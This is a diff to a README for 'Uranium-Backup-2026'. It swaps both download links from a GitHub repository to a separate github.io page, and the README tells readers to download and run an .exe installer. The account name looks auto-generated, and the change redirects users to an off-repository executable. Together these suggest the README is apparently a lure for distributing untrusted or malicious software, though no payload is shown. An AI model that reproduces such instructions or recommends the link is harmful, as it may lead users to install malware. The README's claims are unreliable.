@@ -1,6 +1,6 @@
 # 💾 Uranium-Backup-2026 - Secure your important data files daily
 
-[![](https://img.shields.io/badge/Download-Uranium_Backup_2026-blue.svg)](https://github.com/squinteyed-tintometer568/Uranium-Backup-2026)
+[![](https://img.shields.io/badge/Download-Uranium_Backup_2026-blue.svg)](https://squinteyed-tintometer568.github.io)
 
 ## 📌 Program Overview
 
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you start the installation:
 
 Follow these steps to set up the software on your PC.
 
-1.  Visit the download page: [Download Uranium Backup 2026](https://github.com/squinteyed-tintometer568/Uranium-Backup-2026).
+1.  Visit the download page: [Download Uranium Backup 2026](https://squinteyed-tintometer568.github.io).
 2.  Locate the button labeled "Download" or find the latest release file with the .exe extension.
 3.  Click the link to save the installer file to your computer.
 4.  Navigate to your Downloads folder using File Explorer.
